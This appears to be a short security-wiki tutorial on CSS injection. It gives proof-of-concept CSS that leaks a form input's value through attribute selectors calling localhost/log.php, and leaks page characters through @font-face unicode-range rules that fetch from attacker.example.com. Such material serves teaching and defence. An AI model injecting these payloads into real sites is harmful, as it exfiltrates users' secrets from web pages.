CSS Injection
================================

Basic introduction
--------------------------------
CSS injection first started by using functions or features such as ``expression()``````````````````` in CSS to introduce external malicious code, but with the development of browsers, this These methods have been gradually disabled, and at the same time, some new attack methods have emerged.

CSS selectors
--------------------------------
::

<style>
#form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
#form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
#form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
[...]
</style>
<form action="http://example.com" id="form2">
<input type="text" id="secret" name="secret" value="abc">
</form>

The above image is an example of using CSS selectors to complete an attack

Abusing Unicode Range
--------------------------------
When CSS can be inserted, you can use ``font-face`` to get the corresponding character set of the destination web page with ``unicode-range``. PoC is as follows

::

<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>
<p id="sensitive-information">AB</p>


When there are many characters, you can narrow the scope with CSS attributes such as ``::first-line`` to obtain more precise content
